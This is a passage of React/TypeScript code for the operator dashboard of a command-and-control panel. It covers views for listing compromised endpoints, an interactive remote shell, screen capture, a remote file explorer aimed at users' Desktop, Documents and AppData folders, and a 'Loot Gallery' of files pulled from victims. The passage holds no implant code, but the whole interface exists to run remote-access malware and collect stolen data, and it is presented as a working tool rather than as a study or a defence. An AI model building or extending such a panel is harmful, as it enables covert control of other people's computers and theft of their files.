                  ? 'bg-rose-500/10 text-rose-400 border-rose-500/30 hover:bg-rose-500/20' 
                  : 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30 hover:bg-emerald-500/20'
              }`}
            >
              {serverRunning ? <Square className="w-3 h-3 fill-current" /> : <Play className="w-3 h-3 fill-current" />}
              <span>{serverRunning ? 'Stop Server' : 'Start Server'}</span>
            </button>

            {/* Operator PFP Icon */}
            <img 
              src="/pfp.png" 
              alt="Operator Profile" 
              className="w-7 h-7 rounded-full object-cover border border-c2border shrink-0 ml-1" 
            />
          </div>
        </header>

        {/* MAIN CONTENT AREA */}
        <main className="flex-1 overflow-auto p-5 space-y-4">
            
            {/* ==================== 1. DASHBOARD VIEW ==================== */}
            {activeTab === 'dashboard' && (
              <div className="space-y-4">
                
                {/* WELCOME HEADER */}
                <div className="flex items-center space-x-3.5 pt-1 pb-1">
                  <img 
                    src="/pfp.png" 
                    alt="Operator Profile" 
                    className="w-11 h-11 rounded-full object-cover border-2 border-c2accent shadow-sm" 
                  />
                  <div>
                    <div className="flex items-center space-x-2">
                      <h2 className="text-base font-bold text-white tracking-tight">Welcome, Operator</h2>
                      <span className="px-1.5 py-0.5 rounded text-[9px] font-bold bg-c2accent/15 border border-c2accent/30 text-c2cyan font-mono">
                        ROOT
                      </span>
                    </div>
                    <p className="text-xs text-slate-400 mt-0.5">Here's your live C2 fleet telemetry & command grid</p>
                  </div>
                </div>
                
                {/* ROW 1: HERO METRIC + MINI TARGET CARDS */}
                <div className="grid grid-cols-12 gap-4">
                  
                  {/* Hero Metric Card */}
                  <div className="col-span-5 bg-c2card border border-c2border rounded-xl p-5 relative flex flex-col justify-between shadow-card">
                    <div className="flex items-center justify-between mb-3">
                      <span className="text-xs font-bold text-slate-400 uppercase tracking-wider">Fleet Telemetry</span>
                      <div className="flex items-center space-x-1 bg-c2pill border border-c2border rounded-md px-2 py-0.5 text-[10px] font-bold text-slate-300">
                        <span>LIVE</span>
                        <ChevronDown className="w-3 h-3 text-slate-500" />
                      </div>
                    </div>

                    <div className="my-1">
                      <div className="text-2xl font-bold text-white tracking-tight font-mono">
                        {clients.length} Endpoint{clients.length === 1 ? '' : 's'} Online
                      </div>
                      <div className="flex items-center space-x-2 mt-2">
                        <span className="text-xs text-slate-400">Health:</span>
                        <span className="px-2 py-0.5 rounded-md text-xs font-semibold bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 inline-flex items-center space-x-1">
                          <TrendingUp className="w-3 h-3" />
                          <span>+99.8% Uptime</span>
                        </span>
                      </div>
                    </div>

                    <div className="pt-3 border-t border-c2border/60 flex items-center justify-between text-xs text-slate-400 font-medium">
                      <span>Target: {(clients.find(c => c.id === selectedClientId) || clients[0])?.host || 'None'}</span>
                      <span className="text-c2cyan font-bold">{logs.length} Operations</span>
                    </div>
                  </div>

                  {/* Connected Target Mini Cards */}
                  <div className="col-span-7 bg-c2card border border-c2border rounded-xl p-5 shadow-card flex flex-col justify-between">
                    <div className="flex items-center justify-between mb-2">
                      <span className="text-xs font-bold text-slate-400 uppercase tracking-wider">Connected Fleet Targets</span>
                      <button 
                        onClick={() => setActiveTab('endpoints')}
                        className="text-xs font-semibold text-c2cyan hover:text-white flex items-center space-x-1 transition-colors"
                      >
                        <span>See all</span>
                        <ArrowUpRight className="w-3.5 h-3.5" />
                      </button>
                    </div>

                    <div className="grid grid-cols-3 gap-2.5">
                      {clients.length === 0 ? (
                        <div className="col-span-3 p-6 text-center text-slate-500 text-xs italic">
                          Waiting for endpoints to connect...
                        </div>
                      ) : (
                        clients.slice(0, 3).map((c, idx) => {
                          const isTarget = (selectedClientId ? selectedClientId === c.id : idx === 0);
                          return (
                            <div
                              key={c.id}
                              onClick={() => setSelectedClientId(c.id)}
                              className={`p-3 rounded-lg border transition-all cursor-pointer flex flex-col justify-between ${
                                isTarget
                                  ? 'bg-[#1A2235] border-c2accent shadow-sm'
                                  : 'bg-c2pill border-c2border hover:border-c2borderlight'
                              }`}
                            >
                              <div className="flex items-center justify-between text-xs">
                                <span className="font-bold text-white truncate max-w-[85px]">{c.host}</span>
                                <span className="px-1.5 py-0.5 rounded text-[9px] font-bold bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
                                  ALIVE
                                </span>
                              </div>
                              <div className="my-1.5">
                                <div className="text-base font-bold text-white font-mono">{c.ip}</div>
                                <div className="text-[10px] text-slate-400 truncate">{c.os}</div>
                              </div>
                              <div className="text-[10px] font-mono text-slate-500 flex items-center justify-between">
                                <span>PID: {c.pid}</span>
                                <span className="text-c2cyan font-bold">{isTarget ? 'TARGET' : 'SELECT'}</span>
                              </div>
                            </div>
                          );
                        })
                      )}
                    </div>
                  </div>
                </div>

                {/* ROW 2: REAL CONNECTED ENDPOINTS & FLEET TELEMETRY */}
                <div className="bg-c2card border border-c2border rounded-xl p-4 shadow-card space-y-3">
                  <div className="flex items-center justify-between">
                    <div>
                      <h3 className="text-xs font-bold text-white uppercase tracking-wider">Active Remote Endpoints</h3>
                      <p className="text-[11px] text-slate-400">Select an active machine to target commands & browse filesystem</p>
                    </div>

                    <button 
                      onClick={() => invoke<Client[]>('get_clients').then(setClients)}
                      className="px-2.5 py-1 bg-c2pill border border-c2border hover:border-c2accent text-xs font-medium text-slate-300 hover:text-white rounded-md flex items-center space-x-1.5 transition-colors"
                    >
                      <RefreshCw className="w-3 h-3" />
                      <span>Refresh Fleet</span>
                    </button>
                  </div>

                  <div className="overflow-x-auto">
                    {clients.length === 0 ? (
                      <div className="p-6 text-center text-slate-500 text-xs italic bg-c2pill/50 rounded-lg border border-c2border">
                        No remote endpoints currently connected. Run client executable on target.
                      </div>
                    ) : (
                      <div className="space-y-1.5">
                        {clients.map((c, i) => {
                          const isTarget = (selectedClientId ? selectedClientId === c.id : i === 0);
                          return (
                            <div
                              key={c.id}
                              onClick={() => setSelectedClientId(c.id)}
                              className={`p-3 rounded-lg border transition-all cursor-pointer flex items-center justify-between ${
                                isTarget
                                  ? 'bg-[#1A2235] border-c2accent shadow-sm'
                                  : 'bg-c2pill/60 hover:bg-c2pill border-c2border'
                              }`}
                            >
                              <div className="flex items-center space-x-3">
                                <div className={`p-2 rounded-md border ${isTarget ? 'bg-c2accent text-white border-c2accent' : 'bg-c2bg text-slate-400 border-c2border'}`}>
                                  <Monitor className="w-4 h-4" />
                                </div>
                                <div>
                                  <div className="flex items-center space-x-2">
                                    <span className="font-bold text-white text-xs">{c.host}</span>
                                    <span className="text-[11px] text-slate-400">({c.user})</span>
                                    {isTarget && (
                                      <span className="px-1.5 py-0.5 rounded text-[9px] font-bold bg-c2accent text-white">
                                        ACTIVE TARGET
                                      </span>
                                    )}
                                  </div>
                                  <div className="flex items-center space-x-2 text-[10px] text-slate-400 font-mono mt-0.5">
                                    <span>IP: {c.ip}</span>
                                    <span>•</span>
                                    <span>PID: {c.pid}</span>
                                    <span>•</span>
                                    <span>OS: {c.os}</span>
                                  </div>
                                </div>
                              </div>

                              <div className="flex items-center space-x-2">
                                <span className="px-2 py-0.5 rounded text-[10px] font-semibold bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
                                  {c.status || 'CONNECTED'}
                                </span>
                                <button
                                  onClick={(e) => {
                                    e.stopPropagation();
                                    setSelectedClientId(c.id);
                                    setActiveTab('terminal');
                                  }}
                                  className="px-2.5 py-1 bg-c2bg hover:bg-c2card border border-c2border hover:border-c2borderlight text-xs font-medium text-c2cyan rounded-md transition-colors"
                                >
                                  Open Shell →
                                </button>
                              </div>
                            </div>
                          );
                        })}
                      </div>
                    )}
                  </div>
                </div>

                {/* ROW 3: RECENT C2 ACTIVITY + WATCHLIST / QUICK ACTIONS */}
                <div className="grid grid-cols-12 gap-4">
                  
                  {/* Recent Activity Table */}
                  <div className="col-span-8 bg-c2card border border-c2border rounded-xl p-4 shadow-card flex flex-col justify-between">
                    <div className="flex items-center justify-between mb-3">
                      <div>
                        <h3 className="text-xs font-bold text-white uppercase tracking-wider">Recent C2 Activity</h3>
                        <p className="text-[11px] text-slate-400">Chronological telemetry transactions</p>
                      </div>

                      {/* Pill Filter Tabs */}
                      <div className="flex items-center space-x-1 bg-c2pill p-0.5 rounded-md border border-c2border">
                        {[
                          { id: 'all', label: 'All' },
                          { id: 'files', label: 'Files' },
                          { id: 'processes', label: 'Procs' },
                          { id: 'commands', label: 'Shell' },
                        ].map((f) => (
                          <button
                            key={f.id}
                            onClick={() => setActivityFilter(f.id as any)}
                            className={`px-2.5 py-0.5 rounded text-[10px] font-semibold transition-colors ${
                              activityFilter === f.id
                                ? 'bg-c2accent text-white'
                                : 'text-slate-400 hover:text-slate-200'
                            }`}
                          >
                            {f.label}
                          </button>
                        ))}
                      </div>
                    </div>

                    {/* Activity Event List */}
                    <div className="space-y-1.5 max-h-56 overflow-y-auto pr-1">
                      {logs.length === 0 ? (
                        <div className="p-6 text-center text-slate-500 text-xs italic">Waiting for activity...</div>
                      ) : (
                        (() => {
                          const formattedLogs = [...logs]
                            .reverse()
                            .map(l => ({ log: l, event: formatActivityLog(l) }))
                            .filter(({ event }) => activityFilter === 'all' || event.category === activityFilter);

                          if (formattedLogs.length === 0) {
                            return (
                              <div className="p-6 text-center text-slate-500 text-xs italic">
                                No events matching filter "{activityFilter}"
                              </div>
                            );
                          }

                          return formattedLogs.slice(0, 5).map(({ log, event }, i) => (
                            <div key={i} className="p-2.5 bg-c2pill/60 hover:bg-c2pill border border-c2border rounded-lg transition-all flex items-center justify-between">
                              <div className="flex items-center space-x-2.5 min-w-0 flex-1">
                                <div className="p-1.5 rounded-md bg-c2bg border border-c2border shrink-0">
                                  {event.icon}
                                </div>
                                <div className="min-w-0 flex-1">
                                  <div className="flex items-center space-x-2">
                                    <span className={`px-1.5 py-0.5 rounded text-[9px] font-bold uppercase tracking-wider border ${event.badgeClass}`}>
                                      {event.badge}
                                    </span>
                                    <span className="text-xs font-semibold text-white truncate">{event.title}</span>
                                    <span className="text-[10px] text-slate-500 font-mono truncate">→ {log.client_id}</span>
                                  </div>
                                  <div className="text-[10px] text-slate-400 font-mono truncate mt-0.5 flex items-center space-x-2">
                                    <span className="truncate">{event.detail}</span>
                                    {event.meta && (
                                      <span className="text-slate-600 shrink-0">• {event.meta}</span>
                                    )}
                                  </div>
                                </div>
                              </div>
                              <div className="text-[10px] font-mono text-slate-400 shrink-0 ml-2">
                                {log.timestamp.split(' ')[1] || log.timestamp}
                              </div>
                            </div>
                          ));
                        })()
                      )}
                    </div>
                  </div>

                  {/* Watchlist / Quick Actions Card */}
                  <div className="col-span-4 bg-c2card border border-c2border rounded-xl p-4 shadow-card flex flex-col justify-between">
                    <div>
                      <div className="flex items-center justify-between mb-3">
                        <h3 className="text-xs font-bold text-white uppercase tracking-wider">Quick Actions</h3>
                        <div className="bg-c2pill px-2 py-0.5 rounded text-[9px] font-bold text-c2cyan border border-c2border">
                          SHORTCUTS
                        </div>
                      </div>

                      <div className="space-y-2">
                        {[
                          { label: 'Remote File Explorer', icon: FolderOpen, color: 'text-amber-400', tab: 'files', action: () => setActiveTab('files') },
                          { label: 'Capture Screen', icon: Monitor, color: 'text-cyan-400', tab: 'files', action: () => { executeCommand('screenshot'); setActiveTab('files'); setFileSubTab('loot'); } },
                          { label: 'Process Manager', icon: Cpu, color: 'text-violet-400', tab: 'processes', action: () => setActiveTab('processes') },
                          { label: 'Command Center', icon: TermIcon, color: 'text-blue-400', tab: 'terminal', action: () => setActiveTab('terminal') },
                        ].map((btn, i) => {
                          const Icon = btn.icon;
                          return (
                            <button
                              key={i}
                              onClick={btn.action}
                              className="w-full p-2.5 bg-c2pill/60 hover:bg-c2pill border border-c2border hover:border-c2accent/40 rounded-lg transition-colors flex items-center justify-between text-left group"
                            >
                              <div className="flex items-center space-x-2.5">
                                <div className="p-1.5 rounded-md bg-c2bg border border-c2border group-hover:border-c2accent/50 transition-colors">
                                  <Icon className={`w-3.5 h-3.5 ${btn.color}`} />
                                </div>
                                <span className="text-xs font-semibold text-slate-200 group-hover:text-white transition-colors">{btn.label}</span>
                              </div>
                              <ArrowUpRight className="w-3.5 h-3.5 text-slate-500 group-hover:text-c2cyan transition-colors" />
                            </button>
                          );
                        })}
                      </div>
                    </div>

                    <div className="pt-2.5 border-t border-c2border/60 text-[10px] text-slate-500 font-mono flex items-center justify-between">
                      <span>Listener: Online</span>
                      <span className="text-emerald-400 font-semibold">Port {serverPort}</span>
                    </div>
                  </div>
                </div>

              </div>
            )}

          {/* 2. ENDPOINTS VIEW */}
          {activeTab === 'endpoints' && (
            <div className="space-y-4">
              <div className="flex items-center justify-between">
                <div>
                  <h2 className="text-sm font-bold text-white uppercase tracking-wider">Fleet Management</h2>
                  <p className="text-[11px] text-slate-400">Select an active machine to target commands & explore filesystem</p>
                </div>
                <button 
                  onClick={() => invoke<Client[]>('get_clients').then(setClients)} 
                  className="px-2.5 py-1 bg-c2pill border border-c2border hover:border-c2accent text-xs font-medium text-slate-300 hover:text-white rounded-md flex items-center space-x-1.5 transition-colors"
                >
                  <RefreshCw className="w-3 h-3" />
                  <span>Refresh Fleet</span>
                </button>
              </div>

              <div className="bg-c2card border border-c2border rounded-xl shadow-card overflow-hidden">
                {clients.length === 0 ? (
                  <div className="p-12 text-center flex flex-col items-center justify-center space-y-3">
                    <Monitor className="w-10 h-10 text-slate-600" />
                    <h3 className="text-sm font-bold text-slate-200">No active endpoints connected</h3>
                    <p className="text-xs text-slate-500">Endpoints will appear here automatically when the payload runs on target.</p>
                  </div>
                ) : (
                  <table className="w-full text-left border-collapse">
                    <thead>
                      <tr className="border-b border-c2border bg-slate-900/60 text-[10px] uppercase font-bold text-slate-400 tracking-wider">
                        <th className="p-3.5">Endpoint Host / User</th>
                        <th className="p-3.5">IP Address</th>
                        <th className="p-3.5">PID</th>
                        <th className="p-3.5">Operating System</th>
                        <th className="p-3.5">Status</th>
                        <th className="p-3.5 text-right">Actions</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-c2border text-xs">
                      {clients.map((c, i) => {
                        const isTarget = (selectedClientId ? selectedClientId === c.id : i === 0);
                        return (
                          <tr 
                            key={c.id} 
                            onClick={() => setSelectedClientId(c.id)}
                            className={`transition-colors cursor-pointer ${
                              isTarget ? 'bg-[#1A2235]' : 'hover:bg-c2pill/50'
                            }`}
                          >
                            <td className="p-3.5">
                              <div className="flex items-center space-x-2.5">
                                <div className={`p-1.5 rounded-md border ${isTarget ? 'bg-c2accent text-white border-c2accent' : 'bg-c2bg text-slate-400 border-c2border'}`}>
                                  <Monitor className="w-3.5 h-3.5" />
                                </div>
                                <div>
                                  <div className="flex items-center space-x-2">
                                    <span className="font-bold text-white text-xs">{c.host}</span>
                                    <span className="text-[11px] text-slate-400">({c.user})</span>
                                    {isTarget && (
                                      <span className="px-1.5 py-0.2 rounded text-[9px] font-bold bg-c2accent text-white">
                                        TARGET
                                      </span>
                                    )}
                                  </div>
                                  <div className="text-[10px] text-slate-500 font-mono">ID: {c.id}</div>
                                </div>
                              </div>
                            </td>
                            <td className="p-3.5 font-mono text-slate-200 font-medium">{c.ip}</td>
                            <td className="p-3.5 font-mono text-slate-400">{c.pid}</td>
                            <td className="p-3.5 text-slate-300 font-mono text-[11px]">{c.os}</td>
                            <td className="p-3.5">
                              <span className="px-2 py-0.5 bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-[10px] font-semibold rounded">
                                {c.status || 'ONLINE'}
                              </span>
                            </td>
                            <td className="p-3.5 text-right">
                              <div className="flex items-center justify-end space-x-1.5">
                                <button
                                  onClick={(e) => {
                                    e.stopPropagation();
                                    setSelectedClientId(c.id);
                                    setActiveTab('terminal');
                                  }}
                                  className="px-2.5 py-1 bg-c2bg hover:bg-c2pill border border-c2border hover:border-c2borderlight text-xs font-medium text-c2cyan rounded-md transition-colors"
                                >
                                  Shell
                                </button>
                                <button
                                  onClick={(e) => {
                                    e.stopPropagation();
                                    setSelectedClientId(c.id);
                                    setActiveTab('files');
                                  }}
                                  className="px-2.5 py-1 bg-c2bg hover:bg-c2pill border border-c2border hover:border-c2borderlight text-xs font-medium text-amber-400 rounded-md transition-colors"
                                >
                                  Files
                                </button>
                              </div>
                            </td>
                          </tr>
                        );
                      })}
                    </tbody>
                  </table>
                )}
              </div>
            </div>
          )}

          {/* 3. TERMINAL VIEW */}
          {activeTab === 'terminal' && (
            <div className="h-full flex flex-col space-y-4">
              <div className="bg-c2card border border-c2border p-3 rounded flex items-center justify-between">
                <span className="text-xs font-mono text-c2accent">Target: {clients.length > 0 ? clients[0].id : 'None Selected'}</span>
                <span className="text-xs text-slate-400">Interactive C2 Shell</span>
              </div>

              <div 
                ref={scrollRef}
                className="flex-1 bg-slate-950 border border-c2border rounded p-4 font-mono text-[11px] overflow-y-auto space-y-1 shadow-inner scrollbar-thin scrollbar-thumb-c2border scrollbar-track-transparent"
              >
                {termLogs.map((log, i) => (
                  <div 
                    key={i} 
                    className={`whitespace-pre-wrap break-all leading-relaxed ${
                      log.startsWith('>') ? 'text-c2accent font-bold mt-2' : 
                      log.startsWith('[+]') ? 'text-emerald-400 mt-1' : 
                      'text-slate-300 pl-4 border-l border-slate-800 ml-1 py-1'
                    }`}
                  >
                    {log}
                  </div>
                ))}
              </div>

              <div className="flex items-center space-x-2 overflow-x-auto pb-1">
                {quickCommands.map((item) => (
                  <Tooltip key={item.label} text={item.tip} position="top">
                    <button
                      onClick={() => executeCommand(item.cmd)}
                      className="px-2.5 py-1 bg-c2card border border-c2border rounded text-xs font-mono hover:bg-c2accent hover:text-slate-950 transition-colors whitespace-nowrap"
                    >
                      {item.label}
                    </button>
                  </Tooltip>
                ))}
              </div>

              <div className="relative">
                {suggestions.length > 0 && (
                  <div className="absolute bottom-full mb-1 left-0 w-full bg-c2card border border-c2border rounded shadow-lg overflow-hidden z-10">
                    {suggestions.map((sug, i) => (
                      <div
                        key={i}
                        onClick={() => { setTermInput(sug); setSuggestions([]); }}
                        className="px-3 py-2 text-xs font-mono hover:bg-c2accent hover:text-slate-950 cursor-pointer border-b border-c2border/50 last:border-0"
                      >
                        {sug}
                      </div>
                    ))}
                  </div>
                )}
                <div className="flex space-x-2">
                  <input
                    type="text"
                    value={termInput}
                    onChange={(e) => handleInputChange(e.target.value)}
                    onKeyDown={(e) => e.key === 'Enter' && executeCommand(termInput)}
                    placeholder="Enter command..."
                    className="flex-1 bg-c2card border border-c2border rounded px-4 py-2.5 text-sm font-mono focus:outline-none focus:border-c2accent"
                  />
                  <Tooltip text="Send command to remote machine" position="top">
                    <button
                      onClick={() => executeCommand(termInput)}
                      className="px-5 py-2.5 bg-c2accent text-slate-950 font-semibold rounded hover:bg-c2accenthover transition-colors flex items-center space-x-2"
                    >
                      <Send className="w-4 h-4" />
                      <span>Execute</span>
                    </button>
                  </Tooltip>
                </div>
              </div>
            </div>
          )}

          {/* 4. FILES VIEW */}
          {activeTab === 'files' && (
            <div className="h-full flex flex-col">
              {/* Sub-Navigation */}
              <div className="flex items-center space-x-1 mb-6 bg-slate-900/30 p-1 rounded-lg w-fit border border-c2border/50">
                <button 
                  onClick={() => setFileSubTab('explorer')}
                  className={`px-4 py-1.5 rounded-md text-[10px] font-bold uppercase tracking-wider transition-all ${fileSubTab === 'explorer' ? 'bg-c2accent text-slate-900 shadow-lg' : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800'}`}
                >
                  Remote Explorer
                </button>
                <button 
                  onClick={() => setFileSubTab('loot')}
                  className={`px-4 py-1.5 rounded-md text-[10px] font-bold uppercase tracking-wider transition-all ${fileSubTab === 'loot' ? 'bg-c2accent text-slate-900 shadow-lg' : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800'}`}
                >
                  Loot Gallery
                </button>
              </div>

              {/* Sub-Tab Content */}
              <div className="flex-1 min-h-0">
                {fileSubTab === 'explorer' ? (
                  <div className="h-full bg-c2card border border-c2border rounded flex flex-col overflow-hidden shadow-lg">
                    <div className="p-4 border-b border-c2border bg-slate-900/30 flex items-center justify-between">
                      <div className="flex items-center space-x-3 min-w-0 flex-1">
                        <FolderOpen className="w-5 h-5 text-c2accent shrink-0" />
                        <div className="min-w-0 flex-1">
                          <h2 className="text-xs font-bold uppercase tracking-wider text-slate-400">Remote File Explorer</h2>
                          {renderBreadcrumbs()}
                        </div>
                      </div>
                      <div className="flex items-center space-x-2 shrink-0">
                        <button 
                          onClick={goBack}
                          disabled={navHistoryRef.current.length === 0}
                          className="px-3 py-1.5 bg-slate-800 border border-c2border rounded text-[10px] font-bold hover:bg-slate-700 transition-colors flex items-center space-x-1.5 disabled:opacity-30 disabled:cursor-not-allowed"
                          title="Go back to previous directory"
                        >
                          <span>←</span>
                          <span>BACK</span>
                        </button>
                        <button 
                          onClick={listDrives}
                          className="px-3 py-1.5 bg-slate-800 border border-c2border rounded text-[10px] font-bold hover:bg-slate-700 transition-colors flex items-center space-x-1.5"
                        >
                          <HardDrive className="w-3 h-3" />
                          <span>DRIVES</span>
                        </button>
                        <button 
                          onClick={() => browseFolder(currentPath === 'System Drives' ? '.' : (currentPath || '.'), true)}
                          className="px-3 py-1.5 bg-slate-800 border border-c2border rounded text-[10px] font-bold hover:bg-slate-700 transition-colors flex items-center space-x-1.5"
                        >
                          <RefreshCw className={`w-3 h-3 ${isFilesLoading ? 'animate-spin' : ''}`} />
                          <span>REFRESH</span>
                        </button>
                      </div>
                    </div>

                    <div className="flex-1 flex overflow-hidden">
                      {/* Quick Access Sidebar */}
                      <div className="w-48 border-r border-c2border bg-slate-900/20 flex flex-col shrink-0">
                        <div className="p-3 border-b border-c2border bg-slate-900/40 text-[9px] font-bold text-slate-500 uppercase tracking-widest">
                          Quick Access
                        </div>
                        <div className="flex-1 overflow-y-auto p-2 space-y-1">
                          {[
                            { label: 'Desktop', icon: <Monitor className="w-3 h-3" />, path: 'SPECIAL:Desktop' },
                            { label: 'Documents', icon: <Database className="w-3 h-3" />, path: 'SPECIAL:Documents' },
                            { label: 'Downloads', icon: <HardDrive className="w-3 h-3" />, path: 'SPECIAL:Downloads' },
                            { label: 'Pictures', icon: <ShieldCheck className="w-3 h-3" />, path: 'SPECIAL:Pictures' },
                            { label: 'Videos', icon: <Monitor className="w-3 h-3" />, path: 'SPECIAL:Videos' },
                            { label: 'Music', icon: <RefreshCw className="w-3 h-3" />, path: 'SPECIAL:Music' },
                            { label: 'Favorites', icon: <ShieldCheck className="w-3 h-3" />, path: 'SPECIAL:Favorites' },
                            { label: 'OneDrive', icon: <Database className="w-3 h-3" />, path: 'SPECIAL:OneDrive' },
                            { label: 'AppData', icon: <Database className="w-3 h-3" />, path: 'SPECIAL:AppData' },
                          ].map((item) => (
                            <button
                              key={item.label}
                              onClick={() => browseFolder(item.path)}
                              className="w-full flex items-center space-x-2 px-3 py-2 rounded text-[10px] text-slate-400 hover:bg-slate-800 hover:text-slate-200 transition-colors"
                            >
                              {item.icon}
                              <span>{item.label}</span>
                            </button>
                          ))}
                        </div>
                      </div>

                      <div className="flex-1 overflow-y-auto">
                        {/* Error message */}
                        {fileError && (
                          <div className="m-4 p-3 bg-red-500/10 border border-red-500/30 rounded text-red-400 text-xs flex items-center space-x-2">
                            <ShieldCheck className="w-4 h-4 shrink-0" />
                            <span>{fileError}</span>
                          </div>
                        )}
                        {/* Truncation warning */}
                        {fileTruncated && (
                          <div className="mx-4 mt-4 p-2 bg-amber-500/10 border border-amber-500/30 rounded text-amber-400 text-[10px]">
                            Showing 500 of {fileTotalCount} items. Large directory — some items are hidden.
                          </div>
                        )}
                        {fileList.length === 0 && !fileError ? (
                          <div className="p-24 text-center text-slate-500 text-xs italic flex flex-col items-center justify-center space-y-4">
                            <FolderOpen className="w-12 h-12 opacity-10" />
                            <div>{isFilesLoading ? (
                              <div className="flex flex-col items-center space-y-2">
                                <RefreshCw className="w-5 h-5 animate-spin text-c2accent" />
                                <span>Loading remote files...</span>
                              </div>
                            ) : 'No files listed. Select a client and click Refresh.'}</div>
                          </div>
                        ) : fileList.length > 0 && (
                          <table className="w-full text-left border-collapse">
                            <thead>
                              <tr className="border-b border-c2border bg-slate-900/50 text-[10px] uppercase tracking-wider text-slate-500 font-bold sticky top-0 z-10">
                                <th className="p-4">Name</th>
                                <th className="p-4">Size</th>
                                <th className="p-4">Modified</th>
                                <th className="p-4 text-right">Actions</th>
                              </tr>
                            </thead>
                            <tbody className="divide-y divide-c2border text-[11px]">
                              {/* Parent Directory Button */}
                              {currentPath && currentPath !== 'System Drives' && (
                                <tr 
                                  className="hover:bg-slate-800/30 cursor-pointer transition-colors group"
                                  onDoubleClick={() => {
                                    if (currentPath.length <= 3 && currentPath.includes(':')) {
                                      listDrives();
                                    } else {
                                      browseFolder(currentPath + '/..');
                                    }
                                  }}
                                  onClick={() => {
                                    if (currentPath.length <= 3 && currentPath.includes(':')) {
                                      listDrives();
                                    } else {
                                      browseFolder(currentPath + '/..');
                                    }
                                  }}
                                >
                                  <td className="p-4 font-bold text-c2accent flex items-center space-x-2">
                                    <FolderOpen className="w-4 h-4" />
                                    <span>..</span>
                                  </td>
                                  <td className="p-4 text-slate-500">--</td>
                                  <td className="p-4 text-slate-500">--</td>
                                  <td className="p-4 text-right"></td>
                                </tr>
                              )}
                              {fileList.map((file, i) => {
                                const meta = getFileMeta(file);
                                const fullPath = currentPath === 'System Drives' 
                                  ? file.name 
                                  : (currentPath ? `${currentPath}/${file.name}` : file.name);

                                return (
                                  <tr 
                                    key={i} 
                                    className={`hover:bg-slate-800/30 transition-colors group ${file.is_dir || meta.isPreviewable ? 'cursor-pointer' : ''}`}
                                    onDoubleClick={() => {
                                      if (file.is_dir) {
                                        browseFolder(fullPath);
                                      } else if (meta.isPreviewable) {
                                        requestPreview(fullPath, file.name);
                                      }
                                    }}
                                  >
                                    <td className="p-4 flex items-center space-x-3">
                                      {meta.icon}
                                      <span 
                                        className={`font-medium ${
                                          file.is_dir 
                                            ? 'text-slate-200 cursor-pointer hover:text-c2accent' 
                                            : meta.isPreviewable 
                                              ? 'text-slate-200 hover:text-emerald-400 transition-colors' 
                                              : 'text-slate-300'
                                        }`}
                                        onClick={() => {
                                          if (file.is_dir) {
                                            browseFolder(fullPath);
                                          } else {
                                            requestPreview(fullPath, file.name);
                                          }
                                        }}
                                      >
                                        {file.name}
                                      </span>
                                    </td>
                                    <td className="p-4 font-mono text-slate-400">{file.size}</td>
                                    <td className="p-4 text-slate-500">{file.date}</td>
                                    <td className="p-4 text-right">
                                      {!file.is_dir && (
                                        <div className="flex items-center justify-end space-x-1">
                                          <Tooltip text="Quick Preview" position="left">
                                            <button 
                                              onClick={() => requestPreview(fullPath, file.name)}
                                              className="p-1.5 hover:bg-emerald-500/20 hover:text-emerald-400 text-slate-400 rounded transition-colors"
                                            >
                                              <Eye className="w-4 h-4" />
                                            </button>
                                          </Tooltip>
                                          <Tooltip text="Download file to C2 loot" position="left">
                                            <button 
                                              onClick={() => executeCommand(`download "${fullPath}"`)}
                                              className="p-1.5 hover:bg-c2accent/20 hover:text-c2accent text-slate-400 rounded transition-colors"
                                            >
                                              <HardDrive className="w-4 h-4" />
                                            </button>
                                          </Tooltip>
                                        </div>
                                      )}
                                    </td>
                                  </tr>
                                );
                              })}
                            </tbody>
                          </table>
                        )}
                      </div>
                    </div>
                  </div>
                ) : (
                  <div className="h-full bg-c2card border border-c2border rounded overflow-hidden flex shadow-lg">
                    {/* Loot List */}
                    <div className="w-80 border-r border-c2border flex flex-col bg-slate-900/20">
                      <div className="p-4 border-b border-c2border bg-slate-900/40 text-[10px] font-bold text-slate-500 uppercase tracking-widest">
                        Collected Files ({lootFiles.length})
                      </div>
                      <div className="flex-1 overflow-y-auto">
                        {lootFiles.length === 0 ? (
                          <div className="p-12 text-center text-slate-600 text-[10px] italic">No loot collected yet</div>
                        ) : (
                          lootFiles.map((file, i) => (
                            <div 
                              key={i}
                              onClick={() => viewLoot(file)}
                              className={`p-4 border-b border-c2border/50 cursor-pointer transition-colors hover:bg-slate-800/50 ${selectedLoot?.path === file.path ? 'bg-c2accent/10 border-l-4 border-l-c2accent' : ''}`}
                            >
                              <div className="text-[11px] font-bold text-slate-200 truncate">{file.name}</div>
                              <div className="flex items-center justify-between mt-2">
                                <span className="px-1.5 py-0.5 bg-slate-800 rounded text-[9px] text-slate-400 font-mono uppercase border border-c2border/50">{file.client}</span>
                                <span className="text-[9px] text-slate-500">{file.timestamp}</span>
                              </div>
                            </div>
                          ))
                        )}
                      </div>
                    </div>

                    {/* Loot Preview */}
                    <div className="flex-1 bg-slate-950 flex flex-col relative">
                      {selectedLoot ? (
                        <>
                          <div className="p-4 border-b border-c2border bg-slate-900/40 flex items-center justify-between">
                            <div className="flex items-center space-x-3">
                              <div className="text-[11px] font-mono text-c2accent bg-c2accent/10 px-2 py-1 rounded">{selectedLoot.name}</div>
                              <div className="text-[10px] text-slate-500 uppercase tracking-widest">{Math.round(selectedLoot.size / 1024)} KB</div>
                            </div>
                            <button 
                              onClick={() => {
                                // Trigger browser download of the loot
                                const link = document.createElement('a');
                                link.href = `data:application/octet-stream;base64,${lootContent}`;
                                link.download = selectedLoot.name;
                                link.click();
                              }}
                              className="p-2 hover:bg-slate-800 rounded text-slate-400 hover:text-slate-200 transition-colors"
                            >
                              <HardDrive className="w-4 h-4" />
                            </button>
                          </div>
                          <div className="flex-1 overflow-auto p-8 flex items-center justify-center bg-[radial-gradient(circle_at_center,_var(--tw-gradient-stops))] from-slate-900 to-slate-950">
                            {selectedLoot.name.match(/\.(png|jpg|jpeg|gif)$/i) ? (
                              lootContent ? (
                                <img 
                                  src={`data:image/png;base64,${lootContent}`} 
                                  alt="Loot Preview" 
